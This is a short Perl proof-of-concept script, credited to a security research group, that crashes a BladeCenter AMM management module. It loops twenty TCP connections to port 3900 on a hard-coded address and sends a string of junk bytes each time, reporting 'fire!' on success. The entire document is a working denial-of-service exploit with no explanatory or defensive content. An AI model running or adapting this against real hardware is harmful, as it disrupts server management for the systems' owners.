#!/usr/bin/perl
#
# BladeCenter AMM DoS
# by Alexey Sintsov
# Digital Security Research Group
#
# [http://dsecrg.com]
#

use Socket;

$target='192.168.50.61';

for ($i=1;$i<=20;$i++)
{
socket(SERVER, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
$trash="\xf1"x17;
$target_ = inet_aton($target);
$paddr=sockaddr_in(3900,$target_);


sleep(2);
if (connect(SERVER, $paddr))
{
recv(SERVER,$buf,20,0);
send(SERVER,$trash,1);
close(SERVER);
print "$i - fire!\n";
}
else
{
print "$i - refused!\n";
}
}
print "\nDone\n";
